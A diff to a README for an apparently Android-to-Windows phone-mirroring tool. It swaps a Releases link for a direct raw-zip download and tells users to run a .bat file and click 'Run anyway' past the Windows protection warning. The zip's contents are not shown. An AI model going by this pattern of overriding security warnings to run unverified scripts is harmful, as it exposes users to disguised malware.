@@ -4,7 +4,9 @@ Mirror and control your Android phone on a Windows PC. Plug the phone in with a 
 
 ## Download
 
-Go to **[Releases](../../releases/latest)** and download `PhoneCast-Setup.bat`, then double-click it.
+**[Click here to download PhoneCast-Setup.zip](https://github.com/maiushi/PhoneCast-with-keymap-clicking-only-/raw/main/PhoneCast-Setup.zip)**
+
+Extract the zip, then double-click `PhoneCast-Setup.bat`.
 
 If Windows shows "Windows protected your PC", click **More info**, then **Run anyway**.
 
